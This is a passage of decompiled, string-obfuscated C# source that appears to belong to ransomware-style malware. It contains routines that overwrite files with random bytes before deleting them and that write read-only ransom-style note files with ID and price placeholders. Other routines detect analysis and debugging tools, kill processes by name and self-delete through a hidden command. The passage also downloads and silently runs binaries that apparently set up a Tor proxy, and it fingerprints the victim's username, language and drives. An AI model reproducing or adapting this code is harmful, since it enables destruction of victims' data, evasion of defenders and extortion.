		text = ((!bool_0) ? Class22.smethod_0("\ue706\ue705\ue704\ue703\ue702\ue701\ue700\ue70f\ue70e\ue70d\ue70c\ue70b\ue70a\ue709\ue708\ue717\ue716\ue715\ue714\ue713\ue712\ue711\ue710\ue71f\ue71e\ue71d\ue726\ue725\ue724\ue723\ue722\ue721\ue720\ue72f\ue72e\ue72d\ue72c\ue72b\ue72a\ue729\ue728\ue737\ue736\ue735\ue734\ue733\ue732\ue731\ue730\ue73f\ue73e\ue73d\ue757\ue756\ue755\ue754\ue753\ue752\ue751\ue750\ue75f\ue75e", 59174) : Class22.smethod_0("\ueed2\ueed1\ueed0\ueed7\ueed6\ueed5\ueed4\ueedb\ueeda\ueed9\ueed8\ueedf\ueede\ueedd\ueedc\ueec3\ueec2\ueec1\ueec0\ueec7\ueec6\ueec5\ueec4\ueecb\ueeca\ueec9\ueef2\ueef1\ueef0\ueef7\ueef6\ueef5\ueef4\ueefb\ueefa\ueef9\ueef8\ueeff\ueefe\ueefd\ueefc\ueee3\ueee2\ueee1\ueee0\ueee7\ueee6\ueee5\ueee4\ueeeb\ueeea\ueee9", 61075));
		return new string((from string_0 in Enumerable.Repeat(text, int_0)
			select string_0[random_0.Next(string_0.Length)]).ToArray());
	}

	public static byte[] smethod_12(int int_0)
	{
		byte[] array = new byte[int_0];
		new RNGCryptoServiceProvider().GetNonZeroBytes(array);
		return array;
	}

	public static void smethod_13(string string_0)
	{
		try
		{
			long num = 0L;
			num = new FileInfo(string_0).Length;
			using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_0, FileMode.Create, FileAccess.Write, FileShare.None)))
			{
				Random random = new Random();
				do
				{
					byte value = Convert.ToByte(random.Next(0, 255));
					binaryWriter.Write(value);
					num--;
				}
				while (num != 0L);
				binaryWriter.Flush();
				binaryWriter.Close();
			}
			File.Delete(string_0);
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_14(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string smethod_15(string string_0, int int_0)
	{
		double num = Math.Ceiling((double)string_0.Length / (double)int_0);
		if (num < 2.0)
		{
			return string_0;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; (double)i < num; i++)
		{
			if (i > 0)
			{
				stringBuilder.Append(Environment.NewLine);
			}
			int num2 = i * int_0;
			int length = Math.Min(int_0, string_0.Length - num2);
			string value = string_0.Substring(num2, length);
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static bool smethod_16(string string_0)
	{
		try
		{
			GClass2.GClass3.String_15 = Regex.Replace(GClass2.GClass3.String_15, Class22.smethod_0("\uebd6\uebb6\ueb9d\ueb90\ueb81\ueb8a\ueb83\ueb87\ueb96\ueb97", 60371), Class2.Class3.String_0);
			GClass2.GClass3.String_15 = Regex.Replace(GClass2.GClass3.String_15, Class22.smethod_0("\ue49a\ue4fa\ue4c7\ue4cb\ue4da\ue4d1\ue4cc\ue4d6\ue4d0\ue4d1", 58542), Class22.smethod_0("\uf7d1", 63484) + Convert.ToString(Class2.Class3.String_1));
			GClass2.GClass3.String_15 = Regex.Replace(GClass2.GClass3.String_15, Class22.smethod_0("\uf3da\uf3af\uf38d\uf396\uf39c\uf39a", 62319), GClass2.GClass3.Double_0.ToString().Replace(Class22.smethod_0("\uf0ca", 61668), Class22.smethod_0("\uf7d1", 63484)));
			GClass2.GClass3.String_15 = Regex.Replace(GClass2.GClass3.String_15, Class22.smethod_0("\uf8f2\uf882\uf8b9\uf8be\uf8a3", 63638), Convert.ToString(GClass2.GClass3.String_6));
			GClass2.GClass3.String_15 = Regex.Replace(GClass2.GClass3.String_15, Class22.smethod_0("\uf413\uf473\uf45b\uf457\uf45f\uf45a", 62516), GClass2.GClass3.String_4);
			GClass2.GClass3.String_15 = Regex.Replace(GClass2.GClass3.String_15, Class22.smethod_0("\uee52\uee36\uee1b\uee03\uee12\uee05\uee19\uee16\uee03\uee1e\uee01\uee12", 61046), GClass2.GClass3.String_5);
			GClass2.GClass3.String_16 = Regex.Replace(GClass2.GClass3.String_16, Class22.smethod_0("\uebd6\uebb6\ueb9d\ueb90\ueb81\ueb8a\ueb83\ueb87\ueb96\ueb97", 60371), Class2.Class3.String_0.Replace(Environment.NewLine, Class22.smethod_0("\uf2c7\uf299\uf289\uf2c5", 62122)));
			GClass2.GClass3.String_16 = Regex.Replace(GClass2.GClass3.String_16, Class22.smethod_0("\ue49a\ue4fa\ue4c7\ue4cb\ue4da\ue4d1\ue4cc\ue4d6\ue4d0\ue4d1", 58542), Class22.smethod_0("\uf7d1", 63484) + Convert.ToString(Class2.Class3.String_1));
			GClass2.GClass3.String_16 = Regex.Replace(GClass2.GClass3.String_16, Class22.smethod_0("\uf3da\uf3af\uf38d\uf396\uf39c\uf39a", 62319), GClass2.GClass3.Double_0.ToString().Replace(Class22.smethod_0("\uf0ca", 61668), Class22.smethod_0("\uf7d1", 63484)));
			GClass2.GClass3.String_16 = Regex.Replace(GClass2.GClass3.String_16, Class22.smethod_0("\uf8f2\uf882\uf8b9\uf8be\uf8a3", 63638), Convert.ToString(GClass2.GClass3.String_6));
			GClass2.GClass3.String_16 = Regex.Replace(GClass2.GClass3.String_16, Class22.smethod_0("\uf413\uf473\uf45b\uf457\uf45f\uf45a", 62516), GClass2.GClass3.String_4);
			GClass2.GClass3.String_16 = Regex.Replace(GClass2.GClass3.String_16, Class22.smethod_0("\uee52\uee36\uee1b\uee03\uee12\uee05\uee19\uee16\uee03\uee1e\uee01\uee12", 61046), GClass2.GClass3.String_5);
			string text = "";
			if (GClass2.GClass3.Boolean_15)
			{
				text = Path.Combine(string_0, GClass2.GClass3.String_14.Replace(Class22.smethod_0("\uf693\uf687", 63156), Class2.Class3.String_1)) + Class22.smethod_0("\uf651\uf60b\uf607\uf60b", 63086);
				using (TextWriter textWriter = File.CreateText(text))
				{
					textWriter.Write(GClass2.GClass3.String_15);
					textWriter.Close();
				}
				File.SetAttributes(text, FileAttributes.ReadOnly);
			}
			if (GClass2.GClass3.Boolean_16)
			{
				text = Path.Combine(string_0, GClass2.GClass3.String_14.Replace(Class22.smethod_0("\uf693\uf687", 63156), Class2.Class3.String_1)) + Class22.smethod_0("\uf5d1\uf597\uf58b\uf592\uf593", 62959);
				using (TextWriter textWriter2 = File.CreateText(text))
				{
					textWriter2.Write(GClass2.GClass3.String_16);
					textWriter2.Close();
				}
				File.SetAttributes(text, FileAttributes.ReadOnly);
			}
			return true;
		}
		catch (IOException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string smethod_17(string string_0)
	{
		try
		{
			Random random_0 = new Random();
			string text = new string(string_0.Select(delegate(char char_0)
			{
				if (random_0.Next() % 2 != 0)
				{
					return char_0;
				}
				return (!char.IsUpper(char_0)) ? char_0.ToString().ToUpper().First() : char_0.ToString().ToLower().First();
			}).ToArray());
			StringBuilder stringBuilder = new StringBuilder();
			int num = 0;
			string text2 = text;
			foreach (char value in text2)
			{
				stringBuilder.Append(value);
				_ = ++num % 1;
				stringBuilder.Append('^');
			}
			return stringBuilder.ToString();
		}
		catch (Exception)
		{
		}
		return null;
	}

	public static void smethod_18(int int_0)
	{
		try
		{
			string arg = string.Concat(Class22.smethod_0("\ue687\ue69e\ue699\ue690\ue6d7\ue6c6\ue6c5\ue6c0\ue6d9\ue6c7\ue6d9\ue6c7\ue6d9\ue6c6\ue6d7\ue6da\ue699\ue6d7\ue6c4\ue6d7\ue6c9\ue6d7\ue6b9\ue6a2\ue6bb\ue6d1\ue6d1", 59126) + string.Format(Class22.smethod_0("\uf35b\uf35a\uf353\uf31f\uf310\uf36e\uf31f\uf310\uf379\uf31f\uf310\uf36c\uf31f\uf31d\uf344\uf30f\uf342\uf31d", 62226), Application.get_ExecutablePath()));
			Process process = new Process();
			process.StartInfo.FileName = Class22.smethod_0("\uf75c\uf752\uf75b\uf711\uf75a\uf747\uf75a", 63259);
			process.StartInfo.Arguments = string.Format(Class22.smethod_0("\ue1d4\ue1b8\ue1db\ue180\ue1cb\ue186", 57658), arg);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			Environment.Exit(int_0);
		}
		catch (Exception)
		{
		}
	}

	public static bool smethod_19()
	{
		try
		{
			string text = "";
			text = smethod_14(Class22.smethod_0("\uf092\uf088\uf08c\uf086", 61537), Class22.smethod_0("\uea87\uea96\uea83\uea9f\uead7\uea80\uea9e\uea99\ueac4\ueac5\ueaa8\ueaa1\uea9e\uea93\uea92\uea98\ueab4\uea98\uea99\uea83\uea85\uea98\uea9b\uea9b\uea92\uea85\uead7\uea90\uea92\uea83\uead7\uea99\uea96\uea9a\uea92", 59973));
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			smethod_14(Class22.smethod_0("\ue547\ue552\ue540\ue558\ue55f\ue55a\ue540\ue547", 58643), Class22.smethod_0("\uf6f2", 62989));
			if (text.Contains(Class22.smethod_0("\ue3e1\ue3de\ue3c5\ue3c3\ue3c2\ue3d6\ue3db\ue3f5\ue3d8\ue3cf\ue397\ue3f0\ue3c5\ue3d6\ue3c7\ue3df\ue3de\ue3d4\ue3c4\ue397\ue3f6\ue3d3\ue3d6\ue3c7\ue3c3\ue3d2\ue3c5", 58117)) || text.Contains(Class22.smethod_0("\uf279\uf262\uf258\uf24e\uf25d\uf24a\uf20f\uf27c\uf279\uf268\uf26e", 61995)) || text.Contains(Class22.smethod_0("\uebe7\uebd6\uebc5\uebd6\uebdb\uebdb\uebd2\uebdb\uebc4\ueb97\uebe1\uebde\uebd3\uebd2\uebd8\ueb97\uebf6\uebd3\uebd6\uebc7\uebc3\uebd2\uebc5", 60327)) || text.Contains(Class22.smethod_0("\uf0af\uf0a9\uf0b2\uf0df\uf0be\uf09b\uf09b\uf096\uf08b\uf096\uf090\uf091\uf08c\uf0df\uf0ac\uf0cc\uf0df\uf0ab\uf08d\uf096\uf090\uf0cc\uf0cd\uf0d0\uf0c9\uf0cb", 61551)) || text.Contains(Class22.smethod_0("\ue1e4\ue184\ue197\ue1e3\ue1c5\ue1de\ue1d8\ue184\ue185\ue198\ue181\ue183", 57765)) || smethod_22(Class22.smethod_0("\uf297\uf28a\uf281\uf29c\uf28a\uf29d\uf299\uf286\uf28c\uf28a", 62187)) || smethod_22(Class22.smethod_0("\uf381\uf39a\uf384\uf3a5\uf3a1\uf3b4", 62422)) || smethod_22(Class22.smethod_0("\ueaa1\ueaba\ueaa2\ueaa4\uea85\uea81\uea94", 60101)) || smethod_22(Class22.smethod_0("\uefd3\uefc7\uefea\ueffd\uefd1\ueff7\uefe4\ueffc\uefd1\uefea\uefea\uefe9\uefd2\uefeb\uefe1\uefc6\uefe9\uefe4\ueff6\ueff6", 61313)) || smethod_22(Class22.smethod_0("\ue5e9\ue5fd\ue5d0\ue5c7\ue5eb\ue5cd\ue5de\ue5c6\ue5eb\ue5d0\ue5d0\ue5d3\ue5e8\ue5d1\ue5db", 58811)) || smethod_22(Class22.smethod_0("\uf249\uf252\uf24b\uf250\uf250\uf253\uf24c\uf25b", 62002)) || smethod_22(Class22.smethod_0("\uf84a\uf851\uf84b\uf85d\uf84e\uf859\uf848\uf84e\uf85d\uf845", 63488)) || smethod_22(Class22.smethod_0("\uec89\uec92\uec88\uec9e\uec8d\uec9a\uec8a\uec8c\uec9a\uec8d", 60541)) || smethod_22(Class22.smethod_0("\uee2f\uee3e\uee38\uee0c\uee0d\uee11\uee2a\uee1c\uee0b\uee0f\uee10\uee1a\uee1c", 61017)) || smethod_22(Class22.smethod_0("\ue3b3\ue3a8\ue3a4\ue3a6\ue3b1\ue3ad\ue3a9\ue3b5", 58177)) || smethod_22(Class22.smethod_0("\uf046\uf044\uf05a\uf069\uf055\uf055", 61460)) || smethod_22(Class22.smethod_0("\uebaf\uebad\uebb3\ueb80\uebab\uebb0\uebb0\uebb3\uebac", 60366)) || smethod_22(Class22.smethod_0("\uf249\uf252\uf24b\uf250\uf250\uf253\uf24c\uf25b", 62002)))
			{
				text = smethod_14(Class22.smethod_0("\uf092\uf088\uf08c\uf086", 61537), Class22.smethod_0("\ue48f\ue49e\ue48b\ue497\ue4df\ue4b2\ue4ac\ue4be\ue49c\ue48f\ue496\ue4a0\ue4ab\ue497\ue49a\ue48d\ue492\ue49e\ue493\ue4a5\ue490\ue491\ue49a\ue4ab\ue49a\ue492\ue48f\ue49a\ue48d\ue49e\ue48b\ue48a\ue48d\ue49a", 58477));
			}
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool smethod_20()
	{
		try
		{
			if (!smethod_22(Class22.smethod_0("\ue90c\ue926\ue92c\ue936\ue931\ue92b\ue93a\ue92d\ue931\ue93e\ue933\ue92c\ue965\ue97f\ue928\ue928\ue928\ue971\ue92c\ue926\ue92c\ue936\ue931\ue92b\ue93a\ue92d\ue931\ue93e\ue933\ue92c\ue971\ue93c\ue930\ue932", 59742)) && !smethod_22(Class22.smethod_0("\ue8e2\ue8fc\ue8e7\ue8f0\ue8e6\ue8fd\ue8f4\ue8e7\ue8fe", 59409)) && !smethod_22(Class22.smethod_0("\ue4da\ue4eb\ue4f7\ue4fa\ue4ed\ue4db", 58509)) && !smethod_22(Class22.smethod_0("\uf8dd\uf8ec\uf8f0\uf8fd\uf8ea\uf8dc\uf8fd\uf8ec\uf8fd\uf8fb\uf8ec", 63496)) && !smethod_22(Class22.smethod_0("\uebaf\ueb93\ueb9e\uebdb\uebac\ueb92\ueb89\ueb9e\ueb88\ueb93\ueb9a\ueb89\ueb90\uebdb\uebb5\ueb9e\ueb8f\ueb8c\ueb94\ueb89\ueb90\uebdb\uebba\ueb95\ueb9a\ueb97\ueb82\ueb81\ueb9e\ueb89", 60362)) && !smethod_22(Class22.smethod_0("\ue2a3\ue2b2\ue2aa\ue2b7\ue2a4\ue2a6\ue2b7", 58054)) && !smethod_22(Class22.smethod_0("\ue7dc\ue7d6\ue7dc\ue7ee\ue7c1\ue7ce\ue7c3\ue7d6\ue7d5\ue7ca\ue7dd", 59266)) && !smethod_22(Class22.smethod_0("\ue03b\ue02c\ue03f\ue039\ue006\ue00a\ue018", 57451)) && !smethod_22(Class22.smethod_0("\uf8bc\uf8c5\uf8a3\uf8af\uf88d\uf890\uf898\uf88d\uf89e\uf892\uf8df\uf8b9\uf896\uf893\uf89a\uf88c\uf8a3\uf8a8\uf896\uf88d\uf89a\uf88c\uf897\uf89e\uf88d\uf894\uf8a3", 63711)) && !smethod_22(Class22.smethod_0("\uf3b1\uf3ba\uf3ab\uf3ac\uf3ab\uf3be\uf3ab", 62450)) && !smethod_22(Class22.smethod_0("\ue224\ue239\ue23e\ue231\ue231\ue208\ue23f\ue23e\ue223", 57878)))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void smethod_21()
	{
		try
		{
			string[] array = smethod_23(Class22.smethod_0("\ue180\ue192\ue181\ue183\ue182\ue183\ue19e\ue19b", 57669), Class22.smethod_0("\uf2f2\uf2fb", 62103)).Split(new string[1] { Class22.smethod_0("\ue4a2\ue4a5", 58507) }, StringSplitOptions.RemoveEmptyEntries);
			foreach (string arg in array)
			{
				smethod_22(string.Format(Class22.smethod_0("\uf288\uf29a\uf289\uf28b\uf28a\uf28b\uf296\uf293\uf2d1\uf29a\uf287\uf29a\uf2df\uf29c\uf293\uf2df\uf284\uf2cf\uf282", 62203), arg));
			}
		}
		catch (Exception)
		{
		}
		Thread.Sleep(1000);
	}

	private static bool smethod_22(string string_0)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowTitle.Contains(string_0) || process.ProcessName.Contains(string_0))
				{
					process.Dispose();
					GC.Collect();
					GC.WaitForPendingFinalizers();
					GC.Collect();
					bool flag = true;
				}
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static string smethod_23(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static bool smethod_24(string[] string_0)
	{
		try
		{
			string[] array = smethod_23(Class22.smethod_0("\ue547\ue552\ue540\ue558\ue55f\ue55a\ue540\ue547", 58643), Class22.smethod_0("\ue5aa\ue5d3\ue5a5\ue5aa\ue5c3\ue5ca\ue5a5\ue5c6\ue5d6\ue5d3", 58625)).Split(new string[3]
			{
				Class22.smethod_0("\ue4a2\ue4a5", 58507),
				Class22.smethod_0("\uf5f2", 62972),
				Class22.smethod_0("\uf2f1", 62170)
			}, StringSplitOptions.None);
			List<string> list = new List<string>();
			for (int i = 0; i < array.Length; i++)
			{
				string text = array[i].Split(new char[1] { ',' })[0].ToLower().Replace(Class22.smethod_0("\uf4dd", 62655), "");
				if (!(text == "") && text.Contains(Class22.smethod_0("\uf3d5\uf39e\uf383\uf39e", 62218)))
				{
					list.Add(array[i].Split(new char[1] { ',' })[0].ToLower().Replace(Class22.smethod_0("\uf4dd", 62655), "").Replace(Class22.smethod_0("\uf3d5\uf39e\uf383\uf39e", 62218), ""));
				}
			}
			string[] array2 = list.ToArray();
			foreach (string text2 in array2)
			{
				if (string_0.Contains(text2))
				{
					smethod_14(Class22.smethod_0("\uf69b\uf68e\uf69c\uf684\uf684\uf686\uf683\uf683", 63179), string.Format(Class22.smethod_0("\uf700\uf769\uf70f\uf700\uf766\uf762\uf70f\uf754\uf71f\uf752\uf701\uf74a\uf757\uf74a", 63266), text2));
				}
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string smethod_25()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class22.smethod_0("\ue5f7\ue5d9\ue5c5\ue5de\ue5d3\ue5dd\ue5ce\ue5d8\ue59c\ue5f0\ue5dd\ue5c5\ue5d3\ue5c9\ue5c8\ue5e0\ue5ec\ue5ce\ue5d9\ue5d0\ue5d3\ue5dd\ue5d8", 58752));
			string[] valueNames = registryKey.GetValueNames();
			foreach (string name in valueNames)
			{
				text = text + string.Format(Class22.smethod_0("\uf19c\uf1d7\uf19a", 61926), smethod_3((string)registryKey.GetValue(name))) + Class22.smethod_0("\uf0ca", 61668);
			}
		}
		catch (Exception)
		{
		}
		return text.TrimEnd(new char[1] { ',' });
	}

	public static bool smethod_26()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class22.smethod_0("\ue994\ue9b8\ue9b9\ue9a4\ue9b8\ue9bb\ue9b2", 59863), writable: true);
			if (Registry.GetValue(registryKey.ToString(), Class22.smethod_0("\ue8ac\ue894\ue889\ue89f\ue8b7\ue894\ue89a\ue89f", 59562), null) == null)
			{
				registryKey.SetValue(Class22.smethod_0("\ue8ac\ue894\ue889\ue89f\ue8b7\ue894\ue89a\ue89f", 59562), 1, RegistryValueKind.DWord);
				return true;
			}
			return false;
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static byte[] smethod_27(byte[] byte_0)
	{
		return MD5.Create().ComputeHash(byte_0);
	}

	public static bool smethod_28(string string_0)
	{
		try
		{
			if (string_0.Contains(Class22.smethod_0("\uf3d5\uf39e\uf383\uf39e", 62218)))
			{
				string_0 = string_0.Replace(Class22.smethod_0("\uf3d5\uf39e\uf383\uf39e", 62218), "");
			}
			if (Process.GetProcessesByName(string_0).Length != 0)
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool smethod_29(int int_0)
	{
		int num = 0;
		while (true)
		{
			smethod_24(new string[2]
			{
				Class22.smethod_0("\ue9c3\ue9d8\ue9c5", 59669),
				Class22.smethod_0("\uf789\uf796\uf795\uf790\uf789\uf796", 63449)
			});
			try
			{
				string text = "";
				text = Path.Combine(Path.GetTempPath(), Class22.smethod_0("\uee2d\uee16\uee0b\uee59\uee3b\uee0c\uee17\uee1d\uee15\uee1c", 61049));
				if (!File.Exists(text + Class22.smethod_0("\uf53f\uf537\uf50c\uf511\uf53f\uf517\uf50c\uf511\uf54d\uf506\uf51b\uf506", 62787)) && !File.Exists(text + Class22.smethod_0("\uf3e4\uf3ec\uf3d7\uf3ca\uf3e4\uf3c8\uf3d7\uf3d4\uf3d1\uf3c8\uf3d7\uf396\uf3dd\uf3c0\uf3dd", 62376)))
				{
					byte[] array = null;
					using WebClient webClient = new WebClient();
					webClient.Headers.Add(Class22.smethod_0("\ue989\ue98f\ue999\ue98e\ue9d1\ue99d\ue99b\ue999\ue992\ue988", 59888), GClass2.GClass3.GClass4.String_2);
					webClient.Headers.Add(Class22.smethod_0("\ue7f6\ue7d4\ue7d4\ue7d2\ue7c7\ue7c3", 59285), Class22.smethod_0("\ue3d6\ue3c7\ue3c7\ue3db\ue3de\ue3d4\ue3d6\ue3c3\ue3de\ue3d8\ue3d9\ue398\ue3c1\ue3d9\ue3d3\ue399\ue3d0\ue3de\ue3c3\ue3df\ue3c2\ue3d5\ue399\ue3c1\ue384\ue399\ue3c5\ue3d6\ue3c0", 58293));
					array = webClient.DownloadData(GClass2.GClass3.GClass4.String_0);
					if (array != null)
					{
						string text2 = Path.Combine(Path.GetTempPath(), Path.GetTempFileName() + Class22.smethod_0("\ue2d1\ue285\ue296\ue28f", 58109));
						File.WriteAllBytes(text2, array);
						Class16 @class = new Class16(text2);
						@class.method_0(text);
						@class.Dispose();
						File.Delete(text2);
					}
					array = webClient.DownloadData(GClass2.GClass3.GClass4.String_1);
					if (array != null)
					{
						File.WriteAllBytes(text + Class22.smethod_0("\uf3e4\uf3ec\uf3d7\uf3ca\uf3e4\uf3c8\uf3d7\uf3d4\uf3d1\uf3c8\uf3d7\uf396\uf3dd\uf3c0\uf3dd", 62376), array);
					}
				}
				if (!File.Exists(text + Class22.smethod_0("\uf53f\uf537\uf50c\uf511\uf53f\uf517\uf50c\uf511\uf54d\uf506\uf51b\uf506", 62787)) || !File.Exists(text + Class22.smethod_0("\uf3e4\uf3ec\uf3d7\uf3ca\uf3e4\uf3c8\uf3d7\uf3d4\uf3d1\uf3c8\uf3d7\uf396\uf3dd\uf3c0\uf3dd", 62376)))
				{
					break;
				}
				Process process = new Process();
				process.StartInfo.FileName = text + Class22.smethod_0("\uf53f\uf537\uf50c\uf511\uf53f\uf517\uf50c\uf511\uf54d\uf506\uf51b\uf506", 62787);
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.WorkingDirectory = text + Class22.smethod_0("\uee33\uee3b\uee00\uee1d", 61035);
				process.Start();
				Process process2 = new Process();
				process2.StartInfo.FileName = text + Class22.smethod_0("\uf3e4\uf3ec\uf3d7\uf3ca\uf3e4\uf3c8\uf3d7\uf3d4\uf3d1\uf3c8\uf3d7\uf396\uf3dd\uf3c0\uf3dd", 62376);
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.StartInfo.Arguments = string.Format(Class22.smethod_0("\ueb85\ueb99\ueb95\ueb9d\ueb85\ueba6\ueb97\ueb84\ueb93\ueb98\ueb82\ueba6\ueb84\ueb99\ueb8e\ueb8f\uebcb\ueb8d\uebc6\ueb8b\uebcc\ueb8d\uebc7\ueb8b", 60404), GClass2.GClass3.GClass4.String_3.Split(new char[1] { ':' })[0], GClass2.GClass3.GClass4.String_3.Split(new char[1] { ':' })[1]);
				process2.StartInfo.WorkingDirectory = text + Class22.smethod_0("\uee33\uee3b\uee00\uee1d", 61035);
				process2.Start();
				Thread.Sleep(10000);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Class22.smethod_0("\ue09f\ue083\ue083\ue087\ue084\ue0cd\ue0d8\ue0d8\ue094\ue09f\ue092\ue094\ue09c\ue0d9\ue083\ue098\ue085\ue087\ue085\ue098\ue09d\ue092\ue094\ue083\ue0d9\ue098\ue085\ue090", 57575));
				httpWebRequest.Timeout = 60000;
				WebProxy webProxy = new WebProxy(string.Format(Class22.smethod_0("\uf654\uf648\uf648\uf64c\uf606\uf613\uf613\uf647\uf60c\uf641\uf606\uf647\uf60d\uf641", 62976), GClass2.GClass3.GClass4.String_4.Split(new char[1] { ':' })[0], GClass2.GClass3.GClass4.String_4.Split(new char[1] { ':' })[1]));
				httpWebRequest.Method = Class22.smethod_0("\uf1fb\uf1f9\uf1e8", 61824);
				webProxy.BypassProxyOnLocal = false;
				httpWebRequest.Proxy = webProxy;
				httpWebRequest.UserAgent = GClass2.GClass3.GClass4.String_2;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				string text3 = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
				if (text3.Contains(Class22.smethod_0("\ue3ac\ue390\ue38d\ue38d\ue386\ue3d1\ue3df\ue3a6\ue390\ue38a\ue3df\ue39e\ue38d\ue39a\ue3df\ue391\ue390\ue38b\ue3df\ue38a\ue38c\ue396\ue391\ue398\ue3df\ue3ab\ue390\ue38d\ue3d1", 58363)))
				{
					return false;
				}
				if (!text3.Contains(Class22.smethod_0("\ue6a6\ue68a\ue68b\ue682\ue697\ue684\ue691\ue690\ue689\ue684\ue691\ue68c\ue68a\ue68b\ue696\ue6cb\ue6c5\ue6b1\ue68d\ue68c\ue696\ue6c5\ue687\ue697\ue68a\ue692\ue696\ue680\ue697\ue6c5\ue68c\ue696\ue6c5\ue686\ue68a\ue68b\ue683\ue68c\ue682\ue690\ue697\ue680\ue681\ue6c5\ue691\ue68a\ue6c5\ue690\ue696\ue680\ue6c5\ue6b1\ue68a\ue697\ue6cb", 58977)))
				{
					break;
				}
				string text4 = "";
				text4 = GClass2.GClass3.GClass4.String_6;
				text4 = Regex.Replace(text4, Class22.smethod_0("\uf693\uf687", 63156), Convert.ToString(int_0));
				Class9 class2 = Class9.smethod_0();
				text4 = Regex.Replace(text4, Class22.smethod_0("\ue8c0\ue8d7", 59617), class2.String_1);
				text4 = Regex.Replace(text4, Class22.smethod_0("\ue8ca\ue8dc", 59628), Environment.UserName);
				string text5 = "";
				text5 = Class8.smethod_0();
				if (string.IsNullOrEmpty(text5))
				{
					text5 = Class22.smethod_0("\ue177\ue16c\ue175\ue175", 57657);
				}
				text4 = Regex.Replace(text4, Class22.smethod_0("\uf30a\uf31b", 62219), text5);
				text4 = Regex.Replace(text4, Class22.smethod_0("\uf8ca\uf8da", 63714), Class2.Class3.String_3);
				text4 = Regex.Replace(text4, Class22.smethod_0("\ue8da\ue8c9", 59567), Class2.Class3.String_6);
				text4 = Regex.Replace(text4, Class22.smethod_0("\uee1a\uee08", 60987), Class2.Class3.String_7);
				CultureInfo installedUICulture = CultureInfo.InstalledUICulture;
				text4 = Regex.Replace(text4, Class22.smethod_0("\uec0a\uec17", 60450), installedUICulture.TwoLetterISOLanguageName);
				text4 = Regex.Replace(text4, Class22.smethod_0("\uedc2\uedde", 60838), Convert.ToString(Environment.GetLogicalDrives().Length));
				string text6 = "";
				string text7 = "";
				string text8 = "";
				string text9 = "";
				string[] logicalDrives = Environment.GetLogicalDrives();
				for (int i = 0; i < logicalDrives.Length; i++)
				{
					DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
					text6 = driveInfo.DriveType switch
					{
						DriveType.Unknown => text6 + Class22.smethod_0("\ue587", 58629), 
						DriveType.NoRootDirectory => text6 + Class22.smethod_0("\ue7ce", 59260), 
						DriveType.Removable => text6 + Class22.smethod_0("\uf1ed", 61788), 
						DriveType.Fixed => text6 + Class22.smethod_0("\ue984", 59701), 
						DriveType.Network => text6 + Class22.smethod_0("\uf2ec", 62024), 
						DriveType.CDRom => text6 + Class22.smethod_0("\ued9a", 60843), 
						DriveType.Ram => text6 + Class22.smethod_0("\uf7d9", 63467), 
						_ => text6 + Class22.smethod_0("\uf0da\uf0c6", 61559), 
					} + Class22.smethod_0("\uf0ca", 61668);
					text7 += driveInfo.Name.Substring(0, 1);
					text7 += Class22.smethod_0("\uf0ca", 61668);
					try
					{
						text8 += (driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L;
					}
					catch (Exception)
					{
						text8 += Class22.smethod_0("\ue587", 58629);
					}
					text8 += Class22.smethod_0("\uf0ca", 61668);
					try
					{
						text9 += driveInfo.TotalFreeSpace / 1000000000L;
					}
					catch (Exception)
					{
						text9 += Class22.smethod_0("\ue587", 58629);
					}
					text9 += Class22.smethod_0("\uf0ca", 61668);
				}
				if (text6.Substring(text6.Length - 1, 1) == Class22.smethod_0("\uf0ca", 61668))
				{
					text6 = text6.Remove(text6.Length - 1);
				}
				if (text7.Substring(text7.Length - 1, 1) == Class22.smethod_0("\uf0ca", 61668))
				{
					text7 = text7.Remove(text7.Length - 1);
				}
				if (text8.Substring(text8.Length - 1, 1) == Class22.smethod_0("\uf0ca", 61668))
				{
					text8 = text8.Remove(text8.Length - 1);
				}
				if (text9.Substring(text9.Length - 1, 1) == Class22.smethod_0("\uf0ca", 61668))
				{
					text9 = text9.Remove(text9.Length - 1);
				}
				text4 = text4.Replace(Class22.smethod_0("\uf71c\uf758", 63289), text6);
